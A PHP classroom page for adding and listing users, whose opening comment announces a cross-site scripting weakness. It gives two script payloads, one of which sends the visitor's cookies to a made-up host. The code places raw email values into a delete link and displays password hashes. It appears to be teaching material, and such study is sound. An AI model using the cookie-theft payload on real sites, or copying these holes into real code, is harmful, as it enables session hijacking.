<?php
/*
This page is vulnerable to a cross-side scripting attack

try typing the following into the name or email field:

1. <script>location.href='http://bbc.co.uk'</script>

2. <script>myLoc = 'http://madeupuni.ac.uk?' + document.cookie; location.href=myLoc</script>
*/?>
<?php
session_start();       
require_once "pdo.php";


if (!isset($_SESSION['authorized']) || $_SESSION['authorized'] !== true) {
    
    header('Location: login_form.php');
    exit;
    }
 
if (isset($_SESSION['authorized']) && $_SESSION['authorized'] === TRUE){
    if ( isset($_POST['name']) && isset($_POST['email']) 
        && isset($_POST['password'])) {
        $passwordString = $_POST["password"];
        $passwordHash = password_hash($passwordString, PASSWORD_DEFAULT);
        $sql = "INSERT INTO users (name, email, password) 
                VALUES (:name, :email, :password)";
        echo("<pre>\n".$sql."\n</pre>\n");
        $stmt = $pdo->prepare($sql);
        $stmt->execute(array(
            ':name' => $_POST['name'],
            ':email' => $_POST['email'],
            ':password' => $passwordHash));
    }
  }
    $stmt = $pdo->query("SELECT name, email, password FROM users");
    $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
    ?>
<html>
    <head></head><body>


    <table border="1">

    <?php
    foreach ( $rows as $row ) {
        echo "<tr><td>";
        echo(htmlentities($row['name']));
        echo("</td><td>");
        echo(htmlentities($row['email']));
        echo("</td><td>");
        echo(htmlentities($row['password']));
        echo("<td>");
        echo '<a href="deleteuser.php?deleteid=' . $row['email'] . '">Delete user</a>';
        echo("</td></tr>");
    }   
?>
    </table>



    <p>Add A New User</p>
    <form method="post">
    <p>Name:
    <input type="text" name="name" size="40"></p>
    <p>Email:
    <input type="text" name="email"></p>
    <p>Password:
    <input type="password" name="password"></p>
    <p><input type="submit" value="Add New"/></p>
    </form>
    <button id="logout">logout</button>
    <script>
        const btn = document.getElementById("logout");
        btn.onclick =  () => {
        location.href = "logout.php";
    };
    </script>
    <form method="POST" action="stock.php">
    <button type="submit">Items page</button>
    </body>
</html>